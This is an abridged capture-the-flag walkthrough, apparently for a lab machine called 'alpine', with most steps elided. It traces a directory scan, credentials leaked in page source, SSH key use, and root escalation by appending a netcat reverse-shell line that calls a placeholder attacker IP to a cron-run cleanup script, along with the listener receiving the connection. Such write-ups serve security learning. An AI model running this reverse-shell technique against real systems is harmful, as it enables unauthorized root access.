...
Nothing jumps out from the homepage itself, so a directory scan follows to catch pages that aren't linked from it:
...
**`login.html`** — the rendered page gives nothing away, so the source is next:
...
**`profile.html`** — the same pattern shows up again: a second set of credentials, also exposed in the front-end:
...
Saving the key to a local file and tightening its permissions gets it usable — SSH refuses a private key readable by group or others:
...
### A Writable Root-Run Cleanup Script
...
`sysadmin` has write access to `/opt/scripts/cleanup.sh`, owned by `root`. That combination is what makes this exploitable: a script runs with the privileges of whoever — or whatever — triggers it, not the privileges of whoever last edited the file. `NOTES.txt` already pointed at the missing piece — the cleanup script runs every two minutes, almost certainly via a root-owned cron job. Anything appended to the script now runs as root the next time that job fires.

### Shell as `root`

One line appended to the script drops a reverse shell:

```bash
sysadmin@alpine:~$ echo 'nc <ATTACKER_IP> <PORT> -e /bin/bash' >> /opt/scripts/cleanup.sh
```
...
A listener waits for the callback once the script runs again:

```bash
$ nc -nlvp <PORT>
listening on [any] <PORT> ...
connect to [<ATTACKER_IP>] from (UNKNOWN) [alpine.nyx] 43763
id
